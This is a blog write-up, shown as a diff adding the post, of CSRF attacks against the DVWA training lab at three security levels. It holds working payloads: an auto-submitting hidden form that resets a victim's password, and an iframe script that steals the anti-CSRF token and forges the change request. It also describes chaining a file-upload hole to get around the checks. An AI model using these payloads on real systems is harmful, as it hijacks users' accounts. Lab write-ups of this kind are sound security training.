@@ -1,0 +1,139 @@
+---
+title: "Cross Site Request Forgery (CSRF) - DVWA"
+description: ""
+summary: "Changing the victim's password using CSRF."
+date: 2022-08-17
+draft: false
+author: "Aftab Sama" # ["Me", "You"] # multiple authors
+tags: ["writeups", "challenge", "DVWA", "CSRF"]
+canonicalURL: ""
+showToc: true
+TocOpen: false
+TocSide: 'right'  # or 'left'
+weight: 3
+# aliases: ["/first"]
+hidemeta: false
+comments: false
+disableHLJS: true # to disable highlightjs
+disableShare: true
+hideSummary: false
+searchHidden: false
+ShowReadingTime: true
+ShowBreadCrumbs: true
+ShowPostNavLinks: true
+ShowWordCount: true
+ShowRssButtonInSectionTermList: true
+# UseHugoToc: true
+cover:
+    image: "<image path/url>" # image path/url
+    alt: "<alt text>" # alt text
+    caption: "<text>" # display caption under cover
+    relative: false # when using page bundles set this to true
+    hidden: true # only hide on current single page
+# editPost:
+#     URL: "https://github.com/"
+#     Text: "Suggest Changes" # edit text
+#     appendFilePath: true # to append file path to Edit link
+---
+
+
+### **Security level: low**
+
+<img width="827" alt="image" src="https://user-images.githubusercontent.com/79740895/185393318-096ce7f2-f881-4aee-ba63-1a6c2074fb52.png">
+
+Here we can change password, there is no csrf protection. We can create simple form to auto submit and change password of victim.
+
+HTML code for CSRF:
+  
+```html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.170.131/vulnerabilities/csrf/">
+      <input type="hidden" name="password&#95;new" value="pass" />
+      <input type="hidden" name="password&#95;conf" value="pass" />
+      <input type="hidden" name="Change" value="Change" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+
+we can host this page so when victim visit page their password will automatically change.
+
+I'm using python to host webpage:
+
+Output:
+  
+```Shell
+C:\Users\AFTAB SAMA\Downloads>python -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:192.168.173.222 - - [18/Aug/2022 18:03:11] "GET /csrf-test.html HTTP/1.1" 200 -
+::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] code 404, message File not found
+::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] "GET /favicon.ico HTTP/1.1" 404 -
+```
+
+</details>
+
+
+
+### **Security level: medium**
+
+Same attack won't work, looking at sourcecode we know that server checks where the request came from.
+
+<img width="333" alt="image" src="https://user-images.githubusercontent.com/79740895/185403021-db671fc3-c08d-47e2-8a8f-fdb639e50e90.png">
+
+one way to get around is if we can upload our file in server.
+
+Now first of all change csrf.html into csrf.php file, then set low security level and switch into file uploading vulnerability inside DVWA.
+
+Here the above text file of html form is now saved as csrf.php is successfully uploaded in the server which you can see from given screenshot.
+
+<img width="468" alt="image" src="https://user-images.githubusercontent.com/79740895/185402657-d1e47dc3-2884-4619-a5a6-5dafbe459a68.png">
+
+now we can use this new url: `http://192.168.170.131/hackable/uploads/csrf.php`
+
+password changed.
+
+
+
+### **Security level: high**
+
+This time it use csrf token. we can read this token if we have same origin and we can do that by uploading our payload to server as shown previously.
+
+upload this code to server:
+
+HTML code:
+
+```html
+<html>
+ <body>
+  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
+  <iframe id="myFrame" src="http://192.168.170.131/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
+  <script>
+   function maliciousPayload() {
+    console.log("start");
+    var iframe = document.getElementById("myFrame");
+    var doc = iframe.contentDocument  || iframe.contentWindow.document;
+    var token = doc.getElementsByName("user_token")[0].value;
+const http = new XMLHttpRequest();
+    const url = "http://192.168.170.131/vulnerabilities/csrf/?password_new=hackerman&password_conf=hackerman&Change=Change&user_token="+token+"#";
+    http.open("GET", url);
+    http.send();
+    console.log("password changed");
+   }
+  </script>
+ </body>
+</html>
+```
+
+
+on visiting this url it will read token from DOM and create password change request to server.
+
+<img width="478" alt="image" src="https://user-images.githubusercontent.com/79740895/185408922-c1d9e774-3e43-4170-bcda-3c0269fc6260.png">
+
+Happy Hacking
